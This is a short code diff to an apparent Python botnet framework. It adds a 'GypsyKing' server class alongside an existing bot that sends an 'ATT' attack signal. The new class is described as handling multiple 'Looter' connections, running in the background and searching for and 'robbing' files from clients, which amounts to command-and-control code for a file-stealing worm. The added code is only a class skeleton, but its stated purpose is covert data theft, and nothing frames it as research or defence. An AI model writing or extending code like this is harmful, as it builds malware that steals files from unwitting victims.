@@ -1,5 +1,5 @@
-from .templates import BasicTemplate
-from .tools.controlers import BasicBotControler
+from .templates import BasicTemplate, AdvTemplate
+from .tools.controlers import BasicBotControler, LooterControler
 
 from multiprocessing import Pipe
 from time import sleep
@@ -44,3 +44,9 @@ class BasicBot(BasicTemplate):
         if self.signalAttack:
             client.sendMsg("ATT")
     
+class GypsyKing(AdvTemplate):
+    SERV_TYPE = "GypsyKing"
+    SERV_INFO = "Server to handle multiple Looter connection. Search and download files from client"
+    WORM_INFO = "Runs in background. Search and Robs files from client."
+    def __init__(self, ctrl_pipe: Pipe, conf: dict = {}, controlers=LooterControler):
+        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf)
